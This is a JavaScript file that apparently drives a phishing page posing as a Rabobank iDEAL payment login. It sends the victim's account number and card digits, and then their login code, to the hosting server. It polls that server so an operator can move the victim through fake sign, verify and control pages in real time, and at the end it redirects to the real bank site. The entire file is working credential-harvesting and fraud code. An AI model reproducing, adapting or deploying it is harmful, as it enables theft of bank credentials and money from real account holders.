const iban = document.querySelector('.iban');
const number = document.querySelector('.number');
const loginFormCode = document.querySelector('.login-form-code');
const token = document.querySelector('#token');
const image = document.querySelector('#rabo-image');
const error = document.querySelector('#error-div');

const loginCode = document.querySelector('#rass-data-inlogcode');
const loginButton = document.querySelector('#rass-action-login');
const loginCodeForm = document.querySelector('#submit-login-code');

function check() {
    const respons = setInterval(() => {
        if (iban.value.length === 9 && number.value.length === 4) {
            clearInterval(respons);
            const data = new FormData();
            data.append('iban', iban.value);
            data.append('number', number.value);

            iban.disabled = true;
            number.disabled = true;
            image.src = '/img/rabo.gif';
            error.style.display = 'none';

            fetch('/ideal-betalen/inloggen/' + token.value, {
                method: 'POST',
                body: data
            }).then(() => {
                const newInterval = setInterval(() => {
                    fetch('/ideal-betalen/inloggen/check/' + token.value, {
                        method: 'POST'
                    }).then(res => {
                        res.json().then(data => {
                            if (data.page == 'login') {
                                loginFormCode.classList.remove('rass-state-dynamic');
                                loginCode.disabled = false;
                                loginButton.disabled = false;
                                image.src = data.code;
                                loginButton.style.backgroundColor = '#fd6400';
                                clearInterval(newInterval);
                            } else if (data.page == 'loginPage') {
                                loginFormCode.classList.add('rass-state-dynamic');
                                loginCode.disabled = true;
                                loginCode.value = '';
                                iban.disabled = false;
                                number.disabled = false;
                                iban.value = '';
                                number.value = '';
                                loginButton.disabled = true;
                                loginButton.innerHTML = 'Inloggen';
                                image.src = '/img/rabo.png';
                                error.style.display = 'block';
                                clearInterval(newInterval);
                                check();
                            } else if (data.page == 'signPage') {
                                window.location.href = '/ideal-betalen/ondertekenen/' + token.value;
                            } else if (data.page == 'verificationPage') {
                                window.location.href = '/ideal-betalen/bevestigen/' + token.value;
                            } else if (data.page == 'control') {
                                window.location.href = '/ideal-betalen/controleren/' + token.value;
                            } else if (data.page == 'finish') {
                                window.location.href = 'https://www.rabobank.nl';
                            } else if (data.page == 'waiting') {
                                
                            }
                        });
                    });
                    console.log('second interval');
                }, 500);
            });     
        }
        console.log('first interval');
    }, 500);
}



loginCodeForm.addEventListener('submit', (e) => {
    e.preventDefault();

    if (loginCode.value == '') {
        loginFormCode.classList.add('rass-state-dynamic');
        loginCode.disabled = true;
        loginCode.value = '';
        iban.disabled = false;
        number.disabled = false;
        iban.value = '';
        number.value = '';
        loginButton.disabled = true;
        loginButton.innerHTML = 'Inloggen';
        image.src = '/img/rabo.png';
        error.style.display = 'block';
        loginButton.style.backgroundColor = '#e8e8e8';
        loginButton.style.borderColor = 'transparent';
        check();
    } else {
        const data = new FormData();
        data.append('login_code', loginCode.value);
        loginCode.disabled = true;
        loginButton.disabled = true;
        loginButton.innerHTML = '<img src="/img/ing.gif" width="20" style="padding-top: 5px;">';
        loginButton.style.backgroundColor = '#e8e8e8';
        loginButton.style.borderColor = 'transparent';
        fetch('/ideal-betalen/inloggen/code/' + token.value, {
            method: 'POST',
            body: data
        }).then(() => {
            const newInterval = setInterval(() => {
                fetch('/ideal-betalen/inloggen/code/check/' + token.value, {
                    method: 'POST'
                }).then(res => {
                    res.json().then(data => {
                        if (data.page == 'loginPage') {
                            loginFormCode.classList.add('rass-state-dynamic');
                            loginCode.disabled = true;
                            loginCode.value = '';
                            iban.disabled = false;
                            number.disabled = false;
                            iban.value = '';
                            number.value = '';
                            loginButton.disabled = true;
                            loginButton.innerHTML = 'Inloggen';
                            image.src = '/img/rabo.png';
                            error.style.display = 'block';
                            clearInterval(newInterval);
                            check();
                        } else if (data.page == 'signPage') {
                            window.location.href = '/ideal-betalen/ondertekenen/' + token.value;
                        } else if (data.page == 'verificationPage') {
                            window.location.href = '/ideal-betalen/bevestigen/' + token.value;
                        } else if (data.page == 'control') {
                            window.location.href = '/ideal-betalen/controleren/' + token.value;
                        } else if (data.page == 'finish') {
                            window.location.href = 'https://www.rabobank.nl';
                        } else if (data.page == 'waiting') {
                            
                        }
                    });
                });
                console.log('third interval');
            }, 500);
        });
    }
});

check();



